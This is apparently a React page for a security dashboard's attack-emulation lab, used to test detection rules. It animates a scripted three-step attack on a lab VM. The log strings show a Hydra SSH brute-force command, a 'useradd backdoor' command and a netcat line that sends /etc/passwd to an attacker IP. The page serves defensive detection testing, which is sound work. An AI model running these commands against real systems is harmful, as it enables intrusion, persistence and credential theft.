"use client";

import React, { useState } from "react";
import { 
  Terminal, 
  Play
} from "lucide-react";
import { triggerReplaySimulation } from "@/lib/api";

export default function AttacksPage() {
  const [isExecuting, setIsExecuting] = useState(false);
  const [activeAct, setActiveAct] = useState<number>(0);
  const [terminalLogs, setTerminalLogs] = useState<string[]>([
    "[INIT] Attack Emulation Laboratory Standby",
    "[LAB] Target Host: 192.168.56.10 (Ubuntu Server 24.04)",
    "[LAB] Attacker Sandbox: 192.168.56.20 (Hydra + Caldera Sandcat)",
    "[READY] Select an attack act below or launch full 3-act sequence."
  ]);
  const [toastMessage, setToastMessage] = useState<string | null>(null);

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(null), 4000);
  };

  const handleRunFullChain = async () => {
    setIsExecuting(true);
    setActiveAct(1);
    setTerminalLogs((prev) => [
      ...prev,
      "--------------------------------------------------",
      `[${new Date().toISOString()}] EXECUTION INITIATED: 3-Act Adversary Chain`,
      "[ACT 1] Launching T1110 Brute Force: hydra -l admin -P wordlist.txt ssh://192.168.56.10",
      "  >> sshd[4102]: Failed password for invalid user root from 192.168.56.20 port 49152",
      "  >> sshd[4105]: Failed password for admin from 192.168.56.20 port 49154",
      "  >> sshd[4120]: Accepted password for admin from 192.168.56.20 port 49164",
    ]);

    setTimeout(() => {
      setActiveAct(2);
      setTerminalLogs((prev) => [
        ...prev,
        "[ACT 2] Launching T1136 Account Creation: useradd -m -s /bin/bash backdoor",
        "  >> auditd: type=USER_ADD msg=audit: acct=\"backdoor\" exe=\"/usr/sbin/useradd\" res=success",
      ]);
    }, 1200);

    setTimeout(() => {
      setActiveAct(3);
      setTerminalLogs((prev) => [
        ...prev,
        "[ACT 3] Launching T1041 Exfiltration: nc -nv 192.168.56.20 4444 < /etc/passwd",
        "  >> ufw: [UFW BLOCK EGRESS] OUT=eth0 SRC=192.168.56.10 DST=192.168.56.20 PROTO=TCP DPT=4444",
        "[STATUS] 8 normalized events dispatched to FastAPI endpoint (POST /events).",
        "[VERIFICATION] NetworkX graph correlation created Incident #101.",
      ]);
      triggerReplaySimulation();
      setIsExecuting(false);
      showToast("Attack chain executed and transmitted to SOC daemon!");
    }, 2400);
  };

  return (
    <div className="mx-auto max-w-6xl px-4 sm:px-6 lg:px-8 py-8 sm:py-12 space-y-8">
      {toastMessage && (
        <div className="fixed bottom-6 right-6 z-50">
          <div className="flex items-center space-x-2.5 px-5 py-3 text-xs font-mono rounded-full bg-[var(--bg-surface)] border border-[var(--border-card)] text-[var(--text-primary)] shadow-2xl animate-in slide-in-from-bottom-3">
            <span className="h-1.5 w-1.5 rounded-full bg-rose-500 animate-pulse"></span>
            <span>{toastMessage}</span>
          </div>
        </div>
      )}

      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-6 border-b border-[var(--border-hairline)] gap-4">
        <div>
          <div className="flex items-center space-x-2 text-xs font-mono text-[var(--text-muted)]">
            <span className="uppercase tracking-widest text-[var(--text-secondary)] font-semibold">
              ADVERSARY SIMULATION
            </span>
            <span>&bull;</span>
            <span className="text-cyan-600 dark:text-cyan-400">MITRE ATT&CK Matrix</span>
          </div>
          <h2 className="mt-2 text-2xl sm:text-3xl font-bold tracking-tight text-[var(--text-primary)]">
            Attack Emulation Laboratory
          </h2>
          <p className="text-xs sm:text-sm text-[var(--text-secondary)] mt-1.5 max-w-2xl leading-relaxed">
            Test and validate the Project X detection pipeline by launching the three acts of compromise against the victim VM.
          </p>
        </div>

        <button
          onClick={handleRunFullChain}
          disabled={isExecuting}
          className="btn-metallic-danger flex items-center space-x-2 rounded-full px-5 py-3 text-xs font-semibold cursor-pointer disabled:opacity-50 shrink-0 shadow-sm"
        >
          <Play className={`h-3.5 w-3.5 ${isExecuting ? "animate-spin" : ""}`} />
          <span>{isExecuting ? "Executing Sequence..." : "Run Full 3-Act Attack"}</span>
        </button>
      </div>

      {/* 3-Act Attack Cards Grid */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 sm:gap-6">
        {/* Act 1 */}
        <div className={`metallic-card rounded-2xl p-5 sm:p-6 space-y-4 border transition-all ${
          activeAct === 1 ? "border-rose-500 shadow-lg ring-1 ring-rose-500/30" : "border-[var(--border-card)]"
        }`}>
          <div className="flex items-center justify-between">
            <span className="text-[10px] font-mono font-bold text-[var(--text-muted)]">ACT 01 &bull; T1110</span>
            <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-semibold text-rose-600 dark:text-rose-300 bg-rose-500/10 border border-rose-500/30">
              BRUTE FORCE
            </span>
          </div>
          <h3 className="text-sm font-bold text-[var(--text-primary)]">
            SSH Credential Stuffing
          </h3>
          <p className="text-xs text-[var(--text-secondary)] leading-relaxed">
            Attacker on <code className="font-mono text-[var(--text-primary)] font-semibold">192.168.56.20</code> executes Hydra brute-force against port 22 until an accepted login is recorded.
          </p>
          <div className="pt-2 text-[11px] font-mono text-[var(--text-muted)]">
            Triggers Rule: <strong className="text-[var(--text-primary)]">R1 (5 Fails + 1 Success)</strong>
          </div>
        </div>

        {/* Act 2 */}
        <div className={`metallic-card rounded-2xl p-5 sm:p-6 space-y-4 border transition-all ${
          activeAct === 2 ? "border-purple-500 shadow-lg ring-1 ring-purple-500/30" : "border-[var(--border-card)]"
        }`}>
          <div className="flex items-center justify-between">
            <span className="text-[10px] font-mono font-bold text-[var(--text-muted)]">ACT 02 &bull; T1136</span>
            <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-semibold text-purple-600 dark:text-purple-300 bg-purple-500/10 border border-purple-500/30">
              PERSISTENCE
            </span>
          </div>
          <h3 className="text-sm font-bold text-[var(--text-primary)]">
            Backdoor Account Creation
          </h3>
          <p className="text-xs text-[var(--text-secondary)] leading-relaxed">
            Over the compromised session, the adversary spawns <code className="font-mono text-[var(--text-primary)] font-semibold">useradd backdoor</code>, immediately intercepted by kernel <code className="font-mono text-[var(--text-primary)] font-semibold">auditd</code>.
          </p>
          <div className="pt-2 text-[11px] font-mono text-[var(--text-muted)]">
            Triggers Rule: <strong className="text-[var(--text-primary)]">R2 (Useradd post-login)</strong>
          </div>
        </div>

        {/* Act 3 */}
        <div className={`metallic-card rounded-2xl p-5 sm:p-6 space-y-4 border transition-all ${
          activeAct === 3 ? "border-red-500 shadow-lg ring-1 ring-red-500/30" : "border-[var(--border-card)]"
        }`}>
          <div className="flex items-center justify-between">
            <span className="text-[10px] font-mono font-bold text-[var(--text-muted)]">ACT 03 &bull; T1041</span>
            <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-semibold text-red-600 dark:text-red-300 bg-red-500/10 border border-red-500/30">
              EXFILTRATION
            </span>
          </div>
          <h3 className="text-sm font-bold text-[var(--text-primary)]">
            C2 Channel Outbound Sync
          </h3>
          <p className="text-xs text-[var(--text-secondary)] leading-relaxed">
            Adversary attempts egress connection to external listening socket on port 4444, caught by <code className="font-mono text-[var(--text-primary)] font-semibold">ufw</code> audit logging.
          </p>
          <div className="pt-2 text-[11px] font-mono text-[var(--text-muted)]">
            Triggers Rule: <strong className="text-[var(--text-primary)]">R3 (Outbound C2 Egress)</strong>
          </div>
        </div>
      </div>

      {/* Live Adversary Execution Terminal */}
      <div className="metallic-surface rounded-2xl p-5 sm:p-7 space-y-4 border border-[var(--border-card)]">
        <div className="flex items-center justify-between pb-3 border-b border-[var(--border-hairline)]">
          <div className="flex items-center space-x-2 text-xs font-mono text-[var(--text-primary)] font-bold">
            <Terminal className="h-4 w-4 text-cyan-500" />
            <span>ADVERSARY EMULATION CONSOLE &bull; ATOMICTEST OUTPUT</span>
          </div>
          <span className="text-[11px] font-mono text-[var(--text-muted)]">TTY: /dev/pts/1</span>
        </div>

        <div className="preserve-dark rounded-xl bg-black/95 p-4 font-mono text-xs text-slate-300 h-64 overflow-y-auto space-y-1 border border-white/10 shadow-inner">
          {terminalLogs.map((line, idx) => (
            <div key={idx} className="leading-relaxed">
              {line}
            </div>
          ))}
        </div>
      </div>

      {/* Caldera Profile Specification */}
      <div className="metallic-card rounded-2xl p-5 sm:p-7 space-y-3 border border-[var(--border-card)]">
        <div className="text-[11px] font-mono text-cyan-600 dark:text-cyan-400 uppercase tracking-widest font-bold">
          MITRE CALDERA VERIFICATION INTEGRATION
        </div>
        <h3 className="text-sm font-bold text-[var(--text-primary)]">
          Why the Same Attack Profile is Used Twice
        </h3>
        <p className="text-xs text-[var(--text-secondary)] leading-relaxed">
          The decisive verification proof relies on symmetry: Caldera re-triggers the exact ATT&CK profile (T1110) 
          originating from attacker IP <code className="font-mono text-[var(--text-primary)] font-semibold">192.168.56.20</code> against victim port 22. If the block succeeded, the ability 
          fails to establish a TCP handshake &mdash; confirming mathematical isolation without guessing.
        </p>
      </div>
    </div>
  );
}
